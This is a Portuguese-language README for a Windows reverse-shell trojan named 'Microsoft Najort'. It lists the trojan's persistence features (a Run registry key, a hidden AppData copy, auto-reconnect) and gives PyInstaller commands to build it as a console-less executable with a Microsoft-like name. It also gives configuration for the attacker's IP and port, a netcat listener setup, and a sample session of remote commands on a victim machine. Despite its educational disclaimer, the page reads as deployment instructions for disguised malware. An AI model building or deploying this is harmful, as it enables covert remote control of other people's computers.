<div align='center'>

<img src='./assets/svg/logo.svg' width=300px>
</div>

<br/>
<br/>

>⚠️ Este software é apenas para fins educacionais e de pesquisa em segurança. O desenvolvedor não se responsabiliza por qualquer uso indevido.

## About

**Microsoft Najort** é um trojan de persistência que estabelece conexão reversa com um servidor remoto, permitindo execução remota de comandos. Ele utiliza técnicas avançadas de persistência no sistema Windows.


## Features

* **Execução Remota de Comandos:** Execute comandos do sistema remotamente através de uma conexão TCP

* **Mecanismo de Persistência:** Instala-se automaticamente para sobreviver a reinicializações do sistema

* **Integração com Registro:** Adiciona-se ao Registro do Windows para inicialização automática

* **Cópia de Arquivo:** Copia-se para um diretório oculto do sistema

* **Resiliência de Conexão:** Tenta automaticamente reconectar se a conexão for perdida

* **Gerenciamento de Persistência:** Comandos integrados para verificar e gerenciar o status da persistência


## Installation

```bash
# Instalar PyInstaller
pip install pyinstaller

# Compilar o executável
pyinstaller --onefile --noconsole --name "Microsoft Najort" trojan.py
```

### Configuração

```python
IP = "seu-ip-aqui"      # Substitua pelo IP do seu listener
PORT = 443              # Substitua pela porta desejada
PROGRAM_NAME = "Microsoft Najort"  # Nome de exibição para persistência
```


### Uso

Configurando o Listener (Máquina Atacante)

1. Inicie um listener netcat em sua máquina:

```bash
# Linux/macOS
nc -lvnp 443

# Windows (com netcat)
nc -lvnp 443
```

2. Aguarde a conexão do sistema alvo

### Comandos Disponíveis



### Exemplo de Sessão

```bash
$ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received from 192.168.1.100 49152
[#] Client connected

> whoami
desktop-abc123\usuario

> ipconfig

Configuração de IP do Windows

Adaptador Ethernet Ethernet0:
   Endereço IPv4. . . . . . . . . . . : 192.168.1.100
   Máscara de Sub-rede . . . . . . . . : 255.255.255.0

> /check_persistence
[+] Status da Persistência
[i] Caminho: C:\Users\usuario\AppData\Roaming\Microsoft\Windows\Microsoft Najort.exe
[i] Chave do Registro: Software/Microsoft/Windows/CurrentVersion/Run
[i] Nome: Microsoft Najort

> /exit
Connection closed by foreign host.
```

<br/>
<br/>

<div align='center'>

> Com grandes poderes...
</div>